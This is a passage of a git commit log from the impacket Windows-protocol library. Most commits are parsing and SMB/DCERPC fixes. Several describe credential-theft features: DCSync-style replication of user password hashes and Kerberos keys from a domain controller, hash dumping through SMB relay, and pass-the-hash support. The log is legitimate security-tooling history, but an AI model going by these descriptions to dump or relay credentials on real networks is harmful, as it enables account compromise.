    Disabling parsing rgValues (PREPLVALINF_ARRAY).
    
    * It was reported unpacking errors with that field. Since we don't use it,
      and it's the last pointer, we can discard unpacking it, until we figure
      out what's going on.

commit 8dd7e36e922e1f049163abcbed295dcee25cc4e2
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 14 14:41:00 2015 -0300

    Inside smb3.logoff() we clear the stuff we used in case we want to authenticate again
    within the same connection

commit c8a8e442cb1e24af0eb1ed88ed97b0cd55118e64
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 14 13:01:55 2015 -0300

    Changed requested permission when opening users
    
    * Now we ask for samr.MAXIMUM_ALLOWED so we get more information
    back in the samr.USER_INFORMATION_CLASS.UserAllInformation structure.
    * Fixes https://github.com/CoreSecurity/impacket/issues/81

commit c22b3f6958e02252d4a71eaad308fe661bb7a6ea
Merge: 66901e7d 3dc9df20
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Aug 14 11:38:43 2015 -0300

    Merge pull request #80 from byt3bl33d3r/master
    
    fixed __init__() error in smbrelayx.py and added .gitignore

commit 3dc9df20a6083cd9ce4e701c6024508fed116f14
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Fri Aug 14 15:50:34 2015 +0200

    fixed __init__() error in smbrelayx.py and added .gitignore

commit 66901e7dd81c9a9ca602438a1e7bafcee707a74d
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 12 18:16:17 2015 -0300

    Adding support for CIM_ARRAY_STRING unpacking and...
    
    * Aiming at solving https://github.com/CoreSecurity/impacket/issues/79
    * ENCODED_STRING() now calculates the string length
    * Fix small typo with CIM_TYPE_ENUM.CIM_TYPE_UINT8 and CIM_TYPE_ENUM.CIM_TYPE_SINT8

commit b0294f3a1af46d307ba5c39d8da10dec384ceb33
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 11 15:30:30 2015 -0300

    Adding DRSVerifyName() test case

commit 008f3eafcd914ec97d8b7166af5ab15fbb4a29e8
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 11 15:27:11 2015 -0300

    Returning the string representation instead of the pyasn1 instance

commit 46448f9440a1ff68661737cccc8f2cadd648e113
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 10 20:02:24 2015 -0300

    Added 5.16.4 ATTRTYP-to-OID Conversion helper functions
    
    * EXOP_ERR.dump() now prints the hex number if no item is found

commit dbd7c993bf5fe9a681453c7f3abdd620d065f2ec
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 10 20:01:15 2015 -0300

    Initializing arrayPadding variable

commit 0f5f7ca3057a5b5bf8845f27b982fd7d5261b624
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 9 19:46:37 2015 -0300

    Change PAD patterns for debugging purposes

commit ec7688c3e14cdd96c8e0d125e092fe2f5917e04c
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 22:36:08 2015 -0300

    Unit tests now work if the target machine has many accounts available

commit 1bc241638d4d1a5b4a2abc00f9ca69b8df86f8c3
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 22:15:58 2015 -0300

    Removing unnecesary try: catch: clauses

commit 2f6911155e0a61744dc53dfd5627962db9af4b38
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 20:26:35 2015 -0300

    Adding EXOP_ERR Codes and adjusting DRS_MSG_GETCHGREPLY ulExtendedRet field
    
    * ulExtendedRet is now type EXOP_ERR so you can see the string result
    when you dump() the DRS_MSG_GETCHGREPLY union.

commit fb7e250d75c269ad1754bf5e52950bff5e9cdb64
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 20:11:12 2015 -0300

    Fixing hept_map() so it works in Windows 2003 AD
    
    Under Windows 2003 the Referent IDs cannot be random
    they must have specific values
    otherwise we get a rpc_x_bad_stub_data exception

commit e87b25f319553861d70c47a567565c38d5758bcd
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 17:19:09 2015 -0300

    Adding USER_SERVER_TRUST_ACCOUNT and USER_INTERDOMAIN_TRUST_ACCOUNT when listing target users

commit 116e8a5f457cf716fcfa2aa5e7786cdc52409575
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 17:06:34 2015 -0300

    Oops, forgot one comma!

commit 5abd32150fa2767543e6f5edc6a8b780052ce802
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 16:55:39 2015 -0300

    DRSUAPI support for NTLM hashes history and Kerberos keys (Sup. info)  added

commit 506431dc1ed8fc052616149eda43a9f8f1e7916d
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 4 22:52:47 2015 -0300

    OldPwdHashes, when empty, are '', not None

commit 12e6ca483473f1596554b82135db125d17684642
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 4 08:12:46 2015 -0300

    Fixing typos in methods and variables

commit d194b86e8ab58725d7583b7677e00b5f12905799
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 4 08:03:05 2015 -0300

    Setting alignment explicitly for this array until we fix it elsewhere

commit 7fb4fe2b8b9af6de42402f5b2a40406262f060c4
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 4 03:03:05 2015 -0300

    Fixed typo in variable name

commit e5af7102ee145ba6e0977c24e32c572335d1f127
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 4 02:45:16 2015 -0300

    Adding [MS-DRSR] DRSGetNCChanges approach to download users hashes
    
    * In a nutshell, we ask to replicate a single DSNAME instead of the whole NC.
    [MS-DRDS] "4.1.10.5 Server Behavior of the IDL_DRSGetNCChanges Method details"
    the steps you need to follow to be able to download a single DSNAME.
    Check also "4.1.10.5.12 ProcessFsmoRoleRequest"
    This approach works way faster than VSS and it's also a cleaner implementation.
    * Should work ok with pass-the-hash/ticket/keys
    * Pending history and Kerberos keys dump
    * Old VSS method is still available by using the -use-vss switch.
    
    A lot of testing needed!
    
    Kudos to Benjamin Delpy (@gentilkiwi) for publishing first his tool dsync which
    implements a similar approach (I think). Always rocking:
    https://github.com/gentilkiwi/kekeo/tree/master/dcsync

commit 455260e700e2469d66075849e87ee175b6d4517d
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 3 15:46:56 2015 -0300

    Adding get_session_key method to retrieve the session key from RPC runtime
    
    * This is used for example, by DRSUAPI to decrypt some secrets

commit d5cc2752da68228e24c16b7b0d52e26f77f6301a
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 3 09:41:47 2015 -0300

    Adding example for obtaining the target user's hash.

commit 5d1c29b91c191f629d2108caee75c98411ade44e
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 3 09:40:35 2015 -0300

    Adding the ability to decrypt secret attributes

commit b4677668a28bf604dc914adcd6412f2b87a28e5b
Merge: bec9abc7 cf97e9de
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Aug 2 17:21:42 2015 -0300

    Merge pull request #76 from Hexadite/raise_ioerror
    
    raise socket error instead of exception

commit bec9abc722afb9f071474e3a474f6490d8927700
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 2 17:17:53 2015 -0300

    No need to align before unpacking array referents
    
    The alignment check is performed later in the process

commit cf97e9deda89207c60bdf323c0a77e4419ee3932
Author: Omri Kantor <Omri@hexadite.com>
Date:   Sun Aug 2 10:49:24 2015 +0300

    Exception is to general, should catch socket.error and couple it with additional information.

commit bd54fbfaf9946496082dd9c9581e6ec168a2b81c
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 31 19:51:55 2015 -0300

    Fixed linked list issue with NDR in REPLENTINFLIST.
    
    * Minor changes and typos from the standard document
    * DRSGetNCChanges() finally working great!

commit b24c039d4d8e0a84c5b84b82e6ca54dc5ba38429
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 31 19:42:03 2015 -0300

    Adding lcd (local Change Directory) command
    
    * Wondering why it wasn't there before

commit 21a94333c69737099e7551f7a8ca4fa888ee5597
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 31 19:37:17 2015 -0300

    NDR performance improvements and alignment changes
    
    * Now we're counting the bytes we're advancing through the buffer at the same
      time we're unpacking data types, instead of packing the whole thing back to
      check its length. This should increase performance substantially, especially
      when dealing with big arrays of objects.
    * Fixed some alignment issues when dealing with arrays, especially with the
      size item that preceeds the array.
    Test cases are passing the same way before this commit. However we should
    test this a lot since screwing up with NDR alignment means an unpacking failure.
    Testing needed!

commit 8532e1ee7b28c58c308a5063f9f7792f42919264
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 29 21:32:34 2015 -0300

    Fixing some alignment issues in the NDR.
    
    * It was being triggered in high loaded arrays
    * There are still some issues pending to solve

commit 1fa4e23c0601edb61e28a50c1882e71c5c302688
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 27 20:53:04 2015 -0300

    Removing debug message

commit d724dd6bbf8d4ef46b924c284dc017109c8a662a
Merge: bdfc9d9a f181e6dc
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 25 12:25:01 2015 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit bdfc9d9ac994e1be84bed8b9379b858b4a8b74b6
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 25 12:23:16 2015 -0300

    [MS-DRSR] Directory Replication Service DRSUAPI Interface implementation
    
    - Just starting
    - Test cases added as well

commit dee68bc06e2839e2d6c820d6cc4ace6de95545c1
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 25 12:22:38 2015 -0300

    Adding ULARGE_INTEGER and PULARGE_INTEGER types

commit f181e6dc006f3f85bf5b971d51dbf70732e7200d
Author: 6e726d <6e726d@gmail.com>
Date:   Fri Jul 24 14:53:48 2015 -0300

    Extended present flags support on RadioTap class.
    
    - test_RadioTap.py PEP8 compliant.
    - Modified dot11.py to add support for extended present flags on the
    RadioTap class.
    - Added Radiotap extended present flags tests on test_RadioTap.py.

commit 67ff4f5ae3d5b60fc133d98c34e8523109809c7d
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 23 12:26:50 2015 -0300

    Don't call finish() when there are no instances created.

commit 2d189d58cc0aef1521d13bb4af8be16160ff0a6e
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 23 12:20:14 2015 -0300

    Cleaning up RemoteOperations() activities as well when job's done.

commit 322a3fdc2e4ad37098ce09a27d1a6cc11baa3e93
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 23 12:11:46 2015 -0300

    Dumping target's host hashes if -E switch not specified (only admin).
    
    Be sure secretsdump.py is present in the same directory as smbrelayx.py
    (default if the library is installed using `python setup.py install`).
    Have in mind you can put any code you want in the `doAttack.run()` method.

commit ebcbd20aefb6cab3f9e4afe333cee8e04b7485e6
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 20 09:45:43 2015 -0300

    Added extra check when parsing FIND_FIRST2 responses
    
    - Samba 3.6.9 doesn't set record['NextEntryOffset'] to 0 for the last
    record. Don't know exactly why, 'cause [MS-CIFS] clearly states that:
    
    `NextEntryOffset: (4 bytes): This field contains the offset, in bytes, from this entry in the list to the next entry in the list. If there are no additional entries, the value MUST be zero (0x00000000).`
    
    Now we're checking we reached the end of the buffer, just in case.

commit 5adde556af86317cf8c80a33446fb27ef69ed9ff
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 16 19:38:54 2015 -0300

    Commands are now executed using ITaskSchedulerService interface
    
    * We were previously using ATSVC Interface
    * It now should work with Windows 2012 R2, fixing https://github.com/CoreSecurity/impacket/issues/70. We should test older Windows versions.

commit 3c78caaaf86dd4739e0a18ea6961c7c8c4340da3
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 16 18:59:20 2015 -0300

    Adding hSchRpcRegisterTask helper function
    
    - Fix the definition of PTASK_XML_ERROR_INFO

commit c2f3ca55d7436ddd2c9dfadbf11bf3e067fada04
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 15 19:30:48 2015 -0300

    Upgraded to DCERPC.v5 runtime and Kerberos support added.
    
    Still does not solve https://github.com/CoreSecurity/impacket/issues/70 tho.
    Most probably the atsvc interface is deprectated in Windows 2012 R2.
    We have to try now using ITaskSchedulerService.

commit 5f2ffd3ad6ed96242c4ee57403c7cc3607ec7964
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 15 19:29:48 2015 -0300

    [MS-TSCH] ITaskSchedulerService Interface implementation and test cases.

commit 271f1dc3945724eb992cb74452bb019b3ac2bf3b
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 15 19:29:07 2015 -0300

    Adding [MS-DTYP] 2.3.13 SYSTEMTIME

commit 41c1dcd7c0ec7808ef249c3f31b7e2bde5e7ace5
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 15 19:28:41 2015 -0300

    Minor cosmetic changes

commit 6203d3fa1fc532b12c7409594c35b48d088bb85c
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 9 18:29:24 2015 -0300

    [MS-TSCH] SASec Interface implementation and test cases.
    
    ITaskSchedulerService left.

commit 3e1f7707677a95098c4e6426d726f2f8b98ed496
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 9 17:17:35 2015 -0300

    [MS-TSCH] ATSVC Interface implementation and test cases.
    
    For now just the ATSVC, now going for SASEC

commit 292621b1e807d3395021d88d66faac708fb3b4d8
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 9 16:37:03 2015 -0300

    Capturing output from stderr as well.
    
    Applying patch from @sshock described in https://github.com/CoreSecurity/impacket/issues/73

commit 7ac7b28bff5865c47ea833812b9dbd6a65c2c3a4
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 30 15:30:58 2015 -0300

    Using self.get_target for DCOM StringBinding calculation.
    
    If we specify a FQDN as the target when initiating a DCOMConnection,
    we replace the aNetworkAddr with self.get_target(). This is to help resolving the target system name.

commit ee53b2a39052d79c2812f9712badb0eca452b348
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 26 14:19:16 2015 -0300

    Adding LOG.debug message for the string binding chosen

commit 04518d7ae183af04b65719ec5d5ab60f4ac5635b
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 26 14:15:18 2015 -0300

    Improved DCOM StringBinding calculation
    
    1) When we need to connect to an interface, a list of possible string bindings are sent. Now we're trying to match self.get_target() as much as possible.
    (e.g. self.get_target() is IPv6, then we'll try to get an IPv6 binding, etc)
    2) DCOMConnection.disconnect() now clears the INTERFACE.CONNECTION dictionary
    3) Minor cosmetic changes

commit 6e9024f6b165754b7d31cba27a4e3aa8fedb55e5
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 26 11:49:20 2015 -0300

    Missed break would loop forever when passing a ticket for TDS auth

commit 8c094b79987401a850a03e9999753bc283dccae9
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 25 09:50:19 2015 -0300

    Adding eXecute permissions to the scripts, fixing https://github.com/CoreSecurity/impacket/issues/71

commit 5befbacb4f89fc1539b1fc9c4302ff777c26c770
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 24 18:02:34 2015 -0300

    Adding ULONG_PTR and DWORD_PTR data types

commit 6dfc966bf694e9ec80fab0a23ac01e150ff63b91
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 24 18:01:48 2015 -0300

    Adding debug message when fallbacking to RC4

commit 6ff37c74c975b6940a2dd81d8a57143c39b9fff2
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 24 18:01:07 2015 -0300

    Catching exceptions when login in.

commit b28a55bc4d65fc4da24701b13984ccf008c7b6ab
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 24 17:29:25 2015 -0300

    Adding Kerberos support to TDS (MSSQL)
    
    - Pass the hash/ticket/key support
    - mssqlclient.py: added -k, -aesKey flags

commit e66337e99e9668086b90039df5140b9439625249
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 16 18:55:16 2015 -0300

    Fixes queryFileInformation() bug for SMBServer (SMBv1)

commit 148c0debcc33ce2888b96d5049bb0a998cacc400
Merge: 8a1239fd 7d2dbe50
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 16 16:46:30 2015 -0300

    Merge branch 'rdubourguais-master'
    
    Adding 'Flags management inside SMBv1 stack' and in particular allowing to have UNICODE support for SMBv1
    Thanks @rdubourguais!

commit 7d2dbe5044daa595a8067d002e7cf9f961968aaf
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 16 16:35:59 2015 -0300

    Fixing code for failed test cases for SMBv1
    
    1) test_smb.py: flags2 MUST include smb.SMB.FLAGS2_LONG_NAMES otherwise FIND_FIRST fails
    2) smb.py: check_dir(), remove() and rename() weren't having UNICODE support. Added.
    3) Replacing tabs for spaces

commit b6ea954cc3c9473b6c4100b9a63696903435bf37
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 14:45:35 2015 +0200

    bug fix: check version length before setting __server_os_* in smb.py

commit 7319e5fef6733c3a5f1277e01ba6aa45e58f4324
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 11:20:54 2015 +0200

    Will be managed during negotiation.

commit 2b0b994fddf825941f37391f14d756013dd73816
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 11:18:58 2015 +0200

    Remove duplicate code.

commit 57b119454ed604c2024db4143c1dabbf569721cd
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 11:16:27 2015 +0200

    small bug fix.

commit 328caf150446658ec2621e7a2cd28e6c39cc8da0
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 10:49:24 2015 +0200

    Improve SMB header's flags management and code refactoring

commit cd1d22f392d881b7a4917d16b0fdddf5583bd03e
Merge: cc96628d 8a1239fd
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 09:48:25 2015 +0200

    Merge remote-tracking branch 'upstream/master'

commit 8a1239fd8b7c123e2e743a33cfab3d1107b2b0e0
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 15 20:22:34 2015 -0300

    Adding a new test suite for Unicode Support on SMB1
    
    Feature still not there but the idea is to implement it using manualNegotiate
    and setting the appropiate flags using SMBConnection.negotiateSession().
    Check https://github.com/CoreSecurity/impacket/issues/51 for details.

commit cc96628d0d94d230d67cbfbffc8f965ad44cccfc
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Mon Jun 15 19:37:20 2015 +0200

    Start unicode integration using self.__flags1 and self.__flags2.
    Removing talk* approach.

commit a345fc1c8c94499a455cf59b2c9b757a41aec60d
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Mon Jun 15 10:35:05 2015 +0200

    Bad attribute name fix.

commit 292960fe97a824ef76322eb6a54cc2083755f9c2
Merge: e3fe436c 6bb86b28
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Mon Jun 15 10:30:49 2015 +0200

    merge master upstream.

commit 6bb86b28bba6ce2f0adc3a5e6d6398b48628a93d
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 14 17:47:08 2015 -0300

    Adding @rdubourguais getServer* methods
    
    1) SMBConnection: getServerOSMajor(), getServerOSMinor(), getServerOSBuild()
    2) smb.py and smb3.py related methods to support 1)

commit 675310a11bc3461676afbdc0e21e6d1e57d46dcc
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 14 17:18:20 2015 -0300

    Renaming method's parameter name
    
    data -> negoData

commit ed1d4792c34b1b317426fa013264a808c37fb93a
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 14 16:53:53 2015 -0300

    Detaching protocol version negotiation from SMBConnection constructor
    
    1) You must specify manualNegotiate = True when creating an SMBConnection
    2) Then call SMBConnection.negotiateSession() where you can specify dialect,
    flags and data.
    3) By default everything works the same.

commit 0632c8c48f074380b821202207d28bb52607c6d2
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 14 16:14:33 2015 -0300

    Log the AbstractSyntax when DCERPC Bind request fails

commit 695cbf7049a86e18744e946bac2f701e440c78c4
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 14 16:09:36 2015 -0300

    Porting remaining commands to Structure
    
    1) Added SMB_COM_CHECK_DIRECTORY structure
    2) check_dir(), remove(), rmdir() ported
    3) Removed unused __send_smb_packet()

commit e3fe436cc21b5921a130b088eea4e65d8d2cb0c9
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Fri Jun 12 20:55:07 2015 +0200

    small bug fix.

commit 60abf05d0e83478e14489712bc7949fefa92a8c4
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Fri Jun 12 20:42:53 2015 +0200

    bug fix (calling the wrong function)

commit efa78d6a616619c583aba9ee48c9dacaf39d96b1
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Fri Jun 12 20:35:49 2015 +0200

    adding isTalkingUnicode to smbconnection.py

commit e2512b9e96841a9bcdfc9089e3b528557a35416f
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Fri Jun 12 20:25:34 2015 +0200

    Allowing smbconnection to get the unicode configuration.

commit 25214231b1de8ab1fce6aff2b01cf754f0c05375
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Fri Jun 12 20:00:43 2015 +0200

    Start unicode integration inside SMBv1 stack.

commit e12685ebbdc69c67b0012277f44be4a71eb31b0f
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 11 19:53:31 2015 -0300

    Replacing tab for spaces

commit 299bb6a4d2b74dfd7e1acdb801561b9d9dc158ed
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 11 14:55:03 2015 -0300

    Merging patch by Renaud Dubourguais exposing SMBConnection.isSigningRequired()
    
    The meaning of it is self explanatory ;)

commit 16d5162795dd6cc2a1dfea37a6fc42c395524c0f
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 18:11:20 2015 -0300

    Adjusting test cases for success against a w2k8 DC

commit 457eee71facde00d311af8f6d762f2be969e27fb
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 18:09:58 2015 -0300

    Adjusting test cases for success against a w2k8 DC

commit 270aadd40132fb06b46a339332e590ab9f6f6198
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 17:57:42 2015 -0300

    Code cleanup and improvements
    
    Removed:
    * SMBPacket class
    * recv_packet(): not used anymore, replaced for recvSMB()
    * __raw_retr_file(): (SMB_COM_READ_ANDX should be used)
    * __raw_stor_file(): (SMB_COM_WRITE_ANDX should be used)
    * list_shared(): we list shares through DCERPC, not using the LANMAN approach anymore
    * copy(): not used inside the library
    
    Changed:
    * trans2() renamed to send_trans2()
    * send_trans2() ported to Structure, and proper reassembly in place
    * query_file_info() now uses send_trans2()
    * list_path() rewritten to use Structure, much easier to read.
    * all instances of recv_packet() changed to recvSMB()

commit 91113242b3f79f0399bfbae9a913d265319e28ca
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 17:55:49 2015 -0300

    A better way to test whether the target file is a directory
    
    And also works against an OSX Yosemite SMB Server

commit 8f3592c561452c7b60cf29cc0e8acf9a46cab455
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 17:52:29 2015 -0300

    Adding support for connecting to an OSX Yosemite SMB share.
    
    Yosemite's SMB implementation would complain if the following flags are not
    part of the protocol negotiation:
    FLAGS2_NT_STATUS
    FLAGS2_LONG_NAMES
    FLAGS2_UNICODE
    
    If the first nego packet does not have that, the connection is closed.
    We don't really want to announce UNICODE support for all servers (especially
    against a NT4/SMB1 server), so we're changing these flags only if the
    former flags were rejected.

commit c1e6887b0bebf4aa02c56f48896dbdab5e7939a2
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 17:44:32 2015 -0300

    Setting the minimum privileges to remove a file and directory
    
    Previous setting was broader, and was having issues against a OSX Server

commit a28d3d01921a58191d12e37a21fc0a66e696df63
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 7 23:00:13 2015 -0300

    Catching DCERPCException instead of Exception
    
    More realistic since we're then calling get_packet()

commit 0d9f1cec5c8c83377672fd9d1692a625a653c15c
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 7 22:42:07 2015 -0300

    Unifying DCERPC exceptions to impacket.dcerpc.v5.rpcrt.DCERPCException
    
    You should catch that one for all DCERPC related requests.

commit faac79a54ecd30c1d5804be3ebf2562713f255dc
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 7 20:34:25 2015 -0300

    Adding support for answering DCERPC NetrWkstaGetInfo calls
    
    Why? If you have a SMB Server and, at a client Windows, you execute
    `start \\host` from cmd.exe,  what happens is the client Windows
    not only connects to the SMB Server but also calls, via ncacn_np,
    the WKST DCERPC server NetrWkstaGetInfo function.
    
    If no WKST server is present no Windows Explorer window will pop up.
    
    Currently that's the only call supported, so some testing is
    needing to be sure it doesn't break cases where other calls are
    done (maybe OSX clients).

commit fb439fa9d06690a8f7a79b32429d9b84fae53ffc
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 7 20:31:25 2015 -0300

    Fixes DCERPC Server when a bind to an unknown UUID is requested.
    
    If we have a DCERPC Server bound to an specific UUID and a client
    requests binding to a different UUID (not registered) the server
    was launching an exception due to 'SecondaryAddrLen' not set.

commit 1418dd11c3eb09eca6b90a5680fe71840275a0f3
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 7 20:28:58 2015 -0300

    Fix in SMBTreeConnectAndX_Data to support Samba's smbclient4
    
    Samba's smbclient4 behaves weird when connecting to a tree
    It specifies password len to be 0 when there's actually one NULL byte.
    We're taking care of that situation when acting as a SMB1 server.

commit fa63f520abc550811169d3a29183bdde31cf8acb
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 4 10:21:07 2015 -0300

    Fixed issue https://github.com/CoreSecurity/impacket/issues/67. Thanks @MrTchuss

commit 1994a5c7626fb655bfdaaf328d13a813a42d23b5
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 3 21:22:19 2015 -0300

    Code cleanup / switching to @staticmethod when suitable

commit b1eb2723646fd68c98d338dade72b9f3a7e9a5a5
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 2 16:21:24 2015 -0300

    Fixing typos and indentation errors

commit 39fde4705c9eb77d9df6ac8123d08cf680a87661
Author: asolino <bethus@gmail.com>
Date:   Sat May 30 14:01:06 2015 -0300

    Fixes https://github.com/CoreSecurity/impacket/issues/66 reported by deniskhodus.
    
    We're now testing the `securityBindings` buffer is at least a two bytes long.
    This shouldn't happen in theory, but maybe there are a few remaining bytes
    left (probably padding bytes) in the last round of that loop.
    
    Maybe we should also check if there could be 3 or more bytes left on that buffer,
    but not long enough to fulfill a `SECURITYBINDING` structure.
    If so, then there will be an exception trying to build a `SECURITYBINDING`
    struct. However that error hasn't been reported.

commit 1bec6c9126705c27706c6a9cfffb10a49e782319
Merge: 8ab20793 6a88eb07
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri May 29 10:22:00 2015 -0300

    Merge pull request #64 from lgriner/master
    
    update setup.py: merging change from lgriner, thanks!

commit 6a88eb0720b659056855ecaac76c8b0a1a293c08
Author: Tyrannosaurus Vexed <leegriner@gmail.com>
Date:   Fri May 29 08:30:56 2015 -0400

    update setup.py
    
    typo in the shebang line

commit 8ab20793a00db9c64bbf90d3812d108b9d1ddcbf
Merge: 138b9a16 6085a1a2
Author: asolino <bethus@gmail.com>
Date:   Thu May 28 14:21:34 2015 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit 138b9a16390d5f2d655f119b8ac0362e052bdabf
Author: asolino <bethus@gmail.com>
Date:   Thu May 28 14:10:20 2015 -0300

    Fixes NDRUNION unpacking inside a pointer to an array of union elements
    
    An example of such scenario is [MS-DHCPE], `R_DhcpEnumSubnetElementsV4` call
    (section 3.1.4.31).
    The returned element is a `LPDHCP_SUBNET_ELEMENT_INFO_ARRAY_V4`:
    ```
    typedef struct _DHCP_SUBNET_ELEMENT_INFO_ARRAY_V4 {
      DWORD NumElements;
    [size_is(NumElements)] LPDHCP_SUBNET_ELEMENT_DATA_V4 Elements;
    } DHCP_SUBNET_ELEMENT_INFO_ARRAY_V4,
    *LPDHCP_SUBNET_ELEMENT_INFO_ARRAY_V4;
    ```
    each element of that array is a union like this:
    ```
    && (DhcpIpRangesDhcpOnly <= (E)))?(0):(E))
    typedef struct _DHCP_SUBNET_ELEMENT_DATA_V4 {
      DHCP_SUBNET_ELEMENT_TYPE ElementType;
      [switch_is(ELEMENT_MASK(ElementType)), switch_type(DHCP_SUBNET_ELEMENT_TYPE)]
      union _DHCP_SUBNET_ELEMENT_UNION_V4 {
        [case(DhcpIpRanges)]
        DHCP_IP_RANGE* IpRange; [case(DhcpSecondaryHosts)]
        DHCP_HOST_INFO* SecondaryHost; [case(DhcpReservedIps)]
        DHCP_IP_RESERVATION_V4* ReservedIp; [case(DhcpExcludedIpRanges)]
        DHCP_IP_RANGE* ExcludeIpRange; [case(DhcpIpUsedClusters)]
        DHCP_IP_CLUSTER* IpUsedCluster;
      } Element;
    } DHCP_SUBNET_ELEMENT_DATA_V4, *LPDHCP_SUBNET_ELEMENT_DATA_V4;
    ```
    
    Trying to decode a structure like this would trigger an error.
    
    Main problem was the NDRUNION constructor was interpreting all the
    pointers inside the structure as NDR top level pointers, which is
    not always true (only true if UNION belongs to the NDRCALL directly).
    
    Changing this behaviour seems to fix this issue while mantaining
    the rest of the test cases working. More test is needed tho.

commit 6085a1a2a52a7247c1e9822d2abb66d6f3c81cb5
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed May 27 15:14:49 2015 -0300

    Update README.md

commit 9471616548bb6845c6e4a71ef174ec4f24b9c6e2
Merge: 6ef8ae60 e8253a62
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed May 27 12:27:41 2015 -0300

    Merge pull request #63 from CoolOppo/patch-1
    
    Syntax highlighting and copy-edited README, thanks mate!

commit e8253a62c78b1850ce91d7b8cd17b9c28a7abd0d
